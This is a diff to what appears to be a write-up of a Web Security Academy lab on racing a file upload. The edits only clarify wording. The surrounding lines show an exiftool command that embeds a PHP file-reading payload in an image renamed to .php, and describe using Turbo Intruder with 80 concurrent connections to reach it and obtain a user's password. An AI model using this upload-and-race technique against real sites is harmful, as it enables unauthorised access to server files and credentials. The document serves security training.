@@ -94,7 +94,7 @@ def handleResponse(req, interesting):
         table.add(req)
 ```
 
-I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a 500KB PHP file from the web and used exiftool to add this code to it and renamed it to a PHP file:
+I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a random 500KB PNG file from the web and used exiftool to add this code to it and renamed it to a PHP file:
 
 ```
 exiftool -comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" diamond.php
@@ -133,7 +133,7 @@ Te: trailers
 Connection: close
 ```
 
-then I hit upload to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)
+then I hit upload on the web page in the browser to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)
 
 <br>
 #### Solution 2:  Web Security Academy's Solution
